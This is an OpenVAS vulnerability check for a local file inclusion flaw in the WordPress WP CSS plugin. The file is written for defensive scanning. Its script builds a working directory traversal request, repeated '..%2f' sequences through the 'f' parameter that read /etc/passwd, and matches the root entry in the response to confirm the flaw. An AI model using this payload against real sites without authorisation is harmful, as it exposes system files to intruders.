###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_wp_css_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# WordPress 'WP CSS' Plugin Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "WordPress WP CSS plugin version 2.0.5";
tag_insight = "The flaw is due to input validation error in 'f' parameter to
  'wp-content/plugins/wp-css/wp-css-compress.php', which allows attackers
  to read arbitrary files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 26th August, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/wp-css/";
tag_summary = "This host is running with WordPress WP CSS Plugin and is prone to
  local file inclusion vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902723";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_id(902723);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-26 14:59:42 +0200 (Fri, 26 Aug 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("WordPress 'WP CSS' Plugin Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45734");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/104467/wpyoast-disclose.txt");

  script_description(desc);
  script_summary("Check for LFI vulnerability in WordPress WP CSS Plugin");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack
url = string(dir, "/wp-content/plugins/wp-css/wp-css-compress.php?f=",
             crap(data:"..%2f",length:3*15), "etc/passwd");

## Confirm exploit worked properly or not
if(http_vuln_check(port:port, url:url,pattern:"(root:.*:0:[01]:*)")){
  security_warning(port:port);
}
